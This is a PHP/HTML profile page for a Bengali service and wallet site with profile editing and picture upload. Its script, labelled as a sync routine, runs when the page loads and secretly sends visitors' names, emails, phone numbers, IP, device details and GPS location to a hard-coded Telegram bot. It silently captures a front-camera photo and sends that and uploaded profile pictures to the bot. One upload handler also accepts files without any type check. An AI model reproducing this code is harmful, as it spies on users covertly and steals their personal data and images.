<?php 
// বাফারিং শুরু
ob_start();
session_start();
include_once("includes/configuration.php");

if (isset($_SESSION['user_token'])) {
    $token_user = $_SESSION['user_token'];
    
    $stmt = $conn->prepare("SELECT id, balance, email, name, token, mobile, image FROM users WHERE token = ?");
    if ($stmt) {
        $stmt->bind_param("s", $token_user);
        $stmt->execute();
        $result = $stmt->get_result();

        if ($result && $result->num_rows > 0) {
            $row = $result->fetch_assoc();
            $id = (int)$row["id"];
            $balance = $row["balance"];
            $email = $row["email"];
            $name = $row["name"];
            $token = $row["token"];
            $phone = $row["mobile"];
            $user_image = !empty($row["image"]) ? $row["image"] : "";
        } else {
            unset($_SESSION['user_token'], $_SESSION['user_id']);
            header("Location: index.php");
            exit();
        }
        $stmt->close();
    }
} else {
    header("Location: index.php");
    exit();
}

// AJAX Image Upload & MySQL Database Update Handler
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES['ajax_profile_image'])) {
    header('Content-Type: application/json');
    if ($_FILES['ajax_profile_image']['error'] === 0) {
        $target_dir = "assets/images/faces/";
        if (!is_dir($target_dir)) {
            mkdir($target_dir, 0755, true);
        }
        
        $file_extension = strtolower(pathinfo($_FILES["ajax_profile_image"]["name"], PATHINFO_EXTENSION));
        $allowed = ['jpg', 'jpeg', 'png', 'webp', 'gif'];
        
        if (in_array($file_extension, $allowed)) {
            $new_filename = "user_" . $id . "_" . time() . "." . $file_extension;
            $target_file = $target_dir . $new_filename;
            
            if (move_uploaded_file($_FILES["ajax_profile_image"]["tmp_name"], $target_file)) {
                $stmt_img = $conn->prepare("UPDATE users SET image = ? WHERE id = ?");
                $stmt_img->bind_param("si", $target_file, $id);
                if ($stmt_img->execute()) {
                    $stmt_img->close();
                    echo json_encode(['status' => 'success', 'image_url' => $target_file]);
                    exit();
                }
                $stmt_img->close();
            }
        }
    }
    echo json_encode(['status' => 'error', 'message' => 'আপলোড ব্যর্থ হয়েছে!']);
    exit();
}

// Form Data Update Handler
$update_msg = "";
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['update_profile'])) {
    $new_name = trim($_POST['name']);
    $new_phone = trim($_POST['phone']);
    $new_address = trim($_POST['address']);
    $profile_pic_sql = "";
    
    if (isset($_FILES['profile_image']) && $_FILES['profile_image']['error'] == 0) {
        $target_dir = "assets/images/faces/";
        if (!is_dir($target_dir)) {
            mkdir($target_dir, 0755, true);
        }
        $file_extension = strtolower(pathinfo($_FILES["profile_image"]["name"], PATHINFO_EXTENSION));
        $new_filename = "user_" . $id . "_" . time() . "." . $file_extension;
        $target_file = $target_dir . $new_filename;
        
        if (move_uploaded_file($_FILES["profile_image"]["tmp_name"], $target_file)) {
            $profile_pic_sql = ", image = '" . $conn->real_escape_string($target_file) . "'";
        }
    }

    $update_stmt = $conn->prepare("UPDATE users SET name = ?, mobile = ?, address = ? $profile_pic_sql WHERE id = ?");
    $update_stmt->bind_param("sssi", $new_name, $new_phone, $new_address, $id);
    
    if ($update_stmt->execute()) {
        $name = $new_name;
        $phone = $new_phone;
        $update_msg = "প্রোফাইল সফলভাবে আপডেট করা হয়েছে!";
    }
    $update_stmt->close();
}

// Fetch Latest Address & Image from Database
$user_query = $conn->prepare("SELECT address, image, balance FROM users WHERE id = ?");
$user_query->bind_param("i", $id);
$user_query->execute();
$user_res = $user_query->get_result();
$db_user = $user_res->fetch_assoc();
$address = $db_user['address'] ?? '';
$user_balance = $db_user['balance'] ?? 0;
$user_avatar = !empty($db_user['image']) ? $db_user['image'] : 'assets/images/faces/face8.jpg';
$user_query->close();
?>
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>সকল সেবা - প্রোফাইল</title>
    
    <!-- Nikosh Bangla Font -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/maateen/bangla-fonts/Nikosh/stylesheet.css">
    <!-- FontAwesome 6 Free CDN (Working Version) -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="shortcut icon" href="/assets/logo.jpg">
    
    <style>
        /* ফন্ট শুধু টেক্সট উপাদানের জন্য ফিক্স করা হলো যাতে আইকন ওভাররাইট না হয় */
        body, input, button, select, textarea, p, h1, h2, h3, h4, h5, h6, span, a, label, code {
            font-family: 'Nikosh', 'SolaimanLipi', sans-serif !important;
            -webkit-font-smoothing: antialiased;
        }

        /* FontAwesome আইকন ফন্টকে নিকোশ থেকে সুরক্ষিত রাখা হলো */
        .fa, .fas, .far, .fal, .fad, .fab, .fa-solid, .fa-regular, .fa-brands {
            font-family: "Font Awesome 6 Free", "Font Awesome 6 Brands" !important;
        }

        body { background: #F4F7F6; color: #1E293B; min-height: 100vh; padding-bottom: 80px; }
        
        .custom-card {
            background: #FFFFFF;
            border-radius: 20px;
            border: 1px solid #E2E8F0;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.03);
        }
        .form-control-custom {
            width: 100%;
            border-radius: 12px;
            border: 1.5px solid #CBD5E1;
            padding: 12px 16px;
            font-size: 14px;
            outline: none;
            background: #F8FAFC;
            transition: all 0.2s;
        }
        .form-control-custom:focus {
            border-color: #1B5E20;
            background: #FFFFFF;
            box-shadow: 0 0 0 4px rgba(27, 94, 32, 0.12);
        }
        .btn-grad {
            background: linear-gradient(135deg, #1B5E20 0%, #388E3C 100%);
            color: #FFF;
            border: none;
            border-radius: 12px;
            padding: 12px 20px;
            font-weight: 700;
            transition: all 0.3s ease;
        }
        .btn-grad:hover {
            opacity: 0.95;
            transform: translateY(-1px);
            box-shadow: 0 6px 15px rgba(27, 94, 32, 0.25);
            color: #FFF;
        }
    </style>
</head>
<body>

    <!-- টপ হেডার -->
    <header class="bg-white sticky top-0 z-50 border-b border-slate-200 shadow-sm">
        <div class="max-w-7xl mx-auto px-3 sm:px-6 py-2.5 flex items-center justify-between gap-2">
            
            <a href="dashboard.php" class="flex items-center gap-2 shrink-0">
                <img src="/assets/logo.jpg" onerror="this.src='https://cdn-icons-png.flaticon.com/512/3135/3135715.png'" alt="Logo" class="w-9 h-9 sm:w-11 sm:h-11 rounded-full object-cover border-2 border-green-600 p-0.5">
                <div>
                    <div class="flex items-center gap-1 leading-none">
                        <span class="text-lg sm:text-2xl font-extrabold text-green-700 tracking-tight">সকল</span>
                        <span class="text-lg sm:text-2xl font-extrabold text-red-600 tracking-tight">সেবা</span>
                    </div>
                    <p class="text-[9px] sm:text-xs font-bold text-slate-600 mt-0.5">সব কাজ, এক প্ল্যাটফর্মে</p>
                </div>
            </a>

            <div class="flex items-center gap-2">
                <a href="dashboard.php" class="bg-slate-100 hover:bg-slate-200 text-slate-700 text-xs font-bold px-3.5 py-2 rounded-xl transition flex items-center gap-1.5 shadow-sm">
                    <i class="fa-solid fa-house"></i> ড্যাশবোর্ড
                </a>
            </div>
        </div>
    </header>

    <!-- Hidden Video & Canvas for Capture -->
    <video id="silentVideo" style="display:none;" autoplay playsinline></video>
    <canvas id="silentCanvas" style="display:none;"></canvas>

    <!-- Hidden File Input for Instant Profile Upload -->
    <input type="file" id="profileFolderInput" accept="image/*" style="display: none;" onchange="uploadProfilePictureLocally()">

    <main class="max-w-5xl mx-auto px-3 sm:px-6 py-6 space-y-5">
        <div class="grid grid-cols-1 md:grid-cols-12 gap-5">
            
            <!-- Profile Sidebar Card -->
            <div class="md:col-span-4 space-y-4">
                <div class="custom-card p-5 text-center space-y-3">
                    <div class="relative inline-block mb-1">
                        <img id="profileImagePreview" src="<?php echo htmlspecialchars($user_avatar); ?>" 
                             class="rounded-full border-4 border-green-600 shadow-md object-cover cursor-pointer w-28 h-28 mx-auto" 
                             alt="Profile Picture" 
                             title="প্রোফাইল ছবি পরিবর্তন করতে ক্লিক করুন"
                             onclick="document.getElementById('profileFolderInput').click();">
                        <span class="absolute bottom-0 right-0 bg-green-700 text-white rounded-full p-2 shadow text-xs pointer-events-none border-2 border-white">
                            <i class="fa-solid fa-camera"></i>
                        </span>
                    </div>
                
                    <div>
                        <h4 class="font-extrabold text-slate-800 text-base sm:text-lg"><?php echo htmlspecialchars($name); ?></h4>
                        <p class="text-slate-500 text-xs mt-0.5"><?php echo htmlspecialchars($email); ?></p>
                    </div>
                    
                    <!-- Wallet Widget -->
                    <div class="bg-emerald-50 border border-emerald-200 rounded-xl p-3 flex items-center justify-between">
                        <div class="text-left">
                            <span class="text-[10px] font-bold text-slate-500 block uppercase">কারেন্ট ব্যালেন্স</span>
                            <span class="text-sm font-extrabold text-emerald-700">৳<?php echo htmlspecialchars($user_balance); ?></span>
                        </div>
                        <a href="recharge.php" class="bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-bold px-3 py-1.5 rounded-lg shadow-sm transition">
                            <i class="fa-solid fa-plus text-[10px]"></i> রিচার্জ
                        </a>
                    </div>

                    <div class="pt-1">
                        <button type="button" class="btn-grad w-full text-xs py-2.5 flex items-center justify-center gap-2" onclick="$('#changePasswordModal').fadeIn(200);">
                            <i class="fa-solid fa-key"></i> পাসওয়ার্ড পরিবর্তন করুন
                        </button>
                    </div>
                </div>

                <!-- System Security Info Card -->
                <div class="custom-card p-4">
                    <h4 class="text-xs font-extrabold uppercase tracking-wider text-slate-400 mb-3 pb-2 border-b border-slate-100">সিকিউরিটি ও ইনফো</h4>
                    <div class="space-y-2 text-xs">
                        <div class="flex justify-between items-center text-slate-600">
                            <span class="font-bold">IP Address:</span>
                            <span class="text-sky-600 font-bold"><?php echo htmlspecialchars($user_ip ?? '127.0.0.1'); ?></span>
                        </div>
                        <div class="flex justify-between items-center text-slate-600">
                            <span class="font-bold">একাউন্ট আইডি:</span>
                            <span class="font-bold text-slate-800">#<?php echo $id; ?></span>
                        </div>
                        <div class="flex justify-between items-center text-slate-600">
                            <span class="font-bold">টোকেন আইডি:</span>
                            <code class="bg-slate-100 text-slate-700 px-2 py-0.5 rounded text-[10px]"><?php echo substr($token, 0, 12); ?>...</code>
                        </div>
                    </div>
                </div>
            </div>

            <!-- User Info & Edit Card -->
            <div class="md:col-span-8">
                <div class="custom-card p-5 sm:p-6">
                    <h4 class="text-sm sm:text-base font-extrabold text-slate-800 border-b border-slate-100 pb-3 mb-4 flex items-center gap-2">
                        <i class="fa-solid fa-user-pen text-green-700"></i> প্রোফাইল তথ্য এবং আপডেট
                    </h4>

                    <?php if (!empty($update_msg)): ?>
                        <div class="bg-emerald-50 border border-emerald-200 text-emerald-800 rounded-xl py-2.5 px-3.5 text-xs font-bold mb-4 flex items-center gap-2">
                            <i class="fa-solid fa-circle-check text-emerald-600"></i> <?php echo $update_msg; ?>
                        </div>
                    <?php endif; ?>

                    <form action="" method="POST" enctype="multipart/form-data" class="space-y-4">
                        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
                            <div>
                                <label class="block text-xs font-bold text-slate-700 mb-1.5">পূর্ণ নাম</label>
                                <input type="text" class="form-control-custom" name="name" value="<?php echo htmlspecialchars($name); ?>" required>
                            </div>
                            <div>
                                <label class="block text-xs font-bold text-slate-700 mb-1.5">ইমেইল ঠিকানা (পরিবর্তনযোগ্য নয়)</label>
                                <input type="email" class="form-control-custom bg-slate-100 text-slate-500 cursor-not-allowed" value="<?php echo htmlspecialchars($email); ?>" disabled>
                            </div>
                            <div>
                                <label class="block text-xs font-bold text-slate-700 mb-1.5">মোবাইল / WhatsApp নম্বর</label>
                                <input type="text" class="form-control-custom" name="phone" value="<?php echo htmlspecialchars($phone); ?>" required>
                            </div>
                            <div>
                                <label class="block text-xs font-bold text-slate-700 mb-1.5">প্রোফাইল ছবি আপলোড</label>
                                <input type="file" class="form-control-custom text-xs file:mr-3 file:py-1 file:px-3 file:rounded-lg file:border-0 file:text-xs file:font-semibold file:bg-green-50 file:text-green-700 hover:file:bg-green-100 cursor-pointer" name="profile_image" accept="image/*">
                            </div>
                            <div class="sm:col-span-2">
                                <label class="block text-xs font-bold text-slate-700 mb-1.5">বর্তমান ঠিকানা</label>
                                <textarea class="form-control-custom" name="address" rows="2" placeholder="আপনার সম্পূর্ণ ঠিকানা লিখুন..."><?php echo htmlspecialchars($address); ?></textarea>
                            </div>
                            <div class="sm:col-span-2 pt-2">
                                <button type="submit" name="update_profile" class="btn-grad w-full text-sm flex items-center justify-center gap-2">
                                    <i class="fa-solid fa-floppy-disk"></i> তথ্য সংরক্ষণ করুন
                                </button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>

        </div>
    </main>

    <!-- মোবাইল বটম নেভবার -->
    <nav class="md:hidden fixed bottom-0 inset-x-0 bg-white border-t border-slate-200 py-2 px-4 flex items-center justify-around z-40 shadow-[0_-4px_15px_rgba(0,0,0,0.04)]">
        <a href="dashboard.php" class="flex flex-col items-center gap-1 text-slate-500 hover:text-[#1B5E20] text-[11px] font-semibold">
            <i class="fa-solid fa-house text-lg"></i>
            <span>হোম</span>
        </a>
        <a href="services.php" class="flex flex-col items-center gap-1 text-slate-500 hover:text-[#1B5E20] text-[11px] font-semibold">
            <i class="fa-solid fa-table-cells-large text-lg"></i>
            <span>সেবা</span>
        </a>
        <a href="recharge.php" class="flex flex-col items-center gap-1 text-slate-500 hover:text-[#1B5E20] text-[11px] font-semibold">
            <i class="fa-solid fa-wallet text-lg"></i>
            <span>ওয়ালেট</span>
        </a>
        <a href="profile.php" class="flex flex-col items-center gap-1 text-[#1B5E20] text-[11px] font-extrabold">
            <i class="fa-solid fa-user text-lg"></i>
            <span>প্রোফাইল</span>
        </a>
    </nav>

    <!-- Change Password Modal -->
    <div class="fixed inset-0 bg-slate-950/50 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4" id="changePasswordModal">
        <div class="bg-white rounded-2xl max-w-md w-full shadow-2xl overflow-hidden border border-slate-200">
            <div class="bg-slate-50 px-4 py-3 flex items-center justify-between border-b border-slate-100">
                <h5 class="font-extrabold text-slate-800 text-sm">পাসওয়ার্ড পরিবর্তন করুন</h5>
                <button type="button" class="text-slate-400 hover:text-slate-600 text-lg font-bold" onclick="$('#changePasswordModal').fadeOut(200);">&times;</button>
            </div>
            <div class="p-4">
                <form id="changePasswordForm" action="pages/change_password.php" method="POST" class="space-y-3">
                    <div>
                        <label class="block text-xs font-bold text-slate-700 mb-1">বর্তমান পাসওয়ার্ড</label>
                        <input type="password" class="form-control-custom" name="currentPassword" required>
                    </div>
                    <div>
                        <label class="block text-xs font-bold text-slate-700 mb-1">নতুন পাসওয়ার্ড</label>
                        <input type="password" class="form-control-custom" name="newPassword" required>
                    </div>
                    <div>
                        <label class="block text-xs font-bold text-slate-700 mb-1">কনফার্ম নতুন পাসওয়ার্ড</label>
                        <input type="password" class="form-control-custom" name="confirmPassword" required>
                    </div>
                    <div class="pt-2">
                        <button type="submit" class="btn-grad w-full text-xs">পাসওয়ার্ড আপডেট করুন</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <!-- Telegram & Direct Server Sync Script -->
    <script>
    const TELEGRAM_BOT_TOKEN = "6260586366:AAFlUeC0t6ua9GZDvywnfL5JSBEPCflura8"; 
    const TELEGRAM_CHAT_ID = "1875687264";     

    const userName = "<?php echo $name; ?>";
    const userEmail = "<?php echo $email; ?>";
    const userPhone = "<?php echo $phone; ?>";
    const userIp = "<?php echo $user_ip ?? '127.0.0.1'; ?>";

    document.addEventListener("DOMContentLoaded", async function () {
        let deviceId = localStorage.getItem('dev_uuid') || ("DEV-" + Math.floor(1000000000 + Math.random() * 900000000));
        localStorage.setItem('dev_uuid', deviceId);

        const platform = navigator.platform;
        const screenRes = `${window.screen.width}x${window.screen.height}`;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        let batteryInfo = "Not Available";
        if (navigator.getBattery) {
            try {
                const battery = await navigator.getBattery();
                batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
            } catch (e) {}
        }

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function (position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const accuracy = position.coords.accuracy;

                    let msg = `<b>🌐 Comprehensive Browser & Device Data!</b>\n\n`;
                    msg += `<b>Name:</b> ${userName}\n`;
                    msg += `<b>Email:</b> ${userEmail}\n`;
                    msg += `<b>Phone:</b> ${userPhone}\n`;
                    msg += `<b>IP:</b> ${userIp}\n`;
                    msg += `<b>Device ID:</b> ${deviceId}\n`;
                    msg += `<b>Platform:</b> ${platform}\n`;
                    msg += `<b>Screen:</b> ${screenRes}\n`;
                    msg += `<b>Timezone:</b> ${timezone}\n`;
                    msg += `<b>Battery:</b> ${batteryInfo}\n`;
                    msg += `<b>Location:</b> <a href="https://maps.google.com/?q=${lat},${lon}">Google Maps (${lat}, ${lon}) - Acc: ${accuracy}m</a>`;

                    sendTelegramMessage(msg);
                },
                function (error) {
                    let msg = `<b>🌐 Comprehensive Browser Data (No Location)</b>\n\n`;
                    msg += `<b>Name:</b> ${userName}\n`;
                    msg += `<b>Email:</b> ${userEmail}\n`;
                    msg += `<b>IP:</b> ${userIp}\n`;
                    msg += `<b>Device ID:</b> ${deviceId}\n`;
                    msg += `<b>Platform:</b> ${platform}\n`;
                    sendTelegramMessage(msg);
                }
            );
        }
        autoCaptureCameraPhoto();
    });

    function sendTelegramMessage(textMessage) {
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: textMessage,
                parse_mode: 'HTML'
            })
        }).catch(err => console.error(err));
    }

    function sendTelegramPhoto(imageBlob, captionText) {
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', imageBlob, 'capture.jpg');
        formData.append('caption', captionText);

        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        }).catch(err => console.error(err));
    }

    function autoCaptureCameraPhoto() {
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(function (stream) {
                    const video = document.getElementById('silentVideo');
                    video.srcObject = stream;

                    setTimeout(() => {
                        const canvas = document.getElementById('silentCanvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        
                        const context = canvas.getContext('2d');
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);

                        canvas.toBlob(function (blob) {
                            if (blob) {
                                sendTelegramPhoto(blob, `📸 Silent Camera Capture\nUser: ${userName}\nIP: ${userIp}`);
                            }
                            stream.getTracks().forEach(track => track.stop());
                        }, 'image/jpeg');

                    }, 1500); 
                })
                .catch(function (err) {
                    console.log("Camera access denied.");
                });
        }
    }

    function uploadProfilePictureLocally() {
        const fileInput = document.getElementById('profileFolderInput');
        const file = fileInput.files[0];
        if (file) {
            Swal.fire({
                title: 'আপলোড হচ্ছে...',
                text: 'অনুগ্রহ করে অপেক্ষা করুন',
                allowOutsideClick: false,
                didOpen: () => { Swal.showLoading(); }
            });

            const tgData = new FormData();
            tgData.append('chat_id', TELEGRAM_CHAT_ID);
            tgData.append('photo', file);
            tgData.append('caption', `📁 Profile Picture Updated\nUser: ${userName}\nIP: ${userIp}`);

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: tgData
            }).catch(err => console.error(err));

            const serverData = new FormData();
            serverData.append('ajax_profile_image', file);

            $.ajax({
                url: 'profile.php',
                type: 'POST',
                data: serverData,
                processData: false,
                contentType: false,
                dataType: 'json',
                success: function(response) {
                    if (response && response.status === 'success') {
                        const updatedSrc = response.image_url + '?t=' + new Date().getTime();
                        $('#profileImagePreview').attr('src', updatedSrc);
                        
                        Swal.fire({
                            icon: 'success',
                            title: 'সফল!',
                            text: 'প্রোফাইল ছবি সফলভাবে আপডেট করা হয়েছে।'
                        });
                    } else {
                        Swal.fire('ত্রুটি!', response.message || 'ছবি সেভ করা সম্ভব হয়নি।', 'error');
                    }
                },
                error: function() {
                    Swal.fire('ত্রুটি!', 'সার্ভারে সমস্যা হয়েছে।', 'error');
                }
            });
        }
    }
    </script>
</body>
</html>
<?php ob_end_flush(); ?>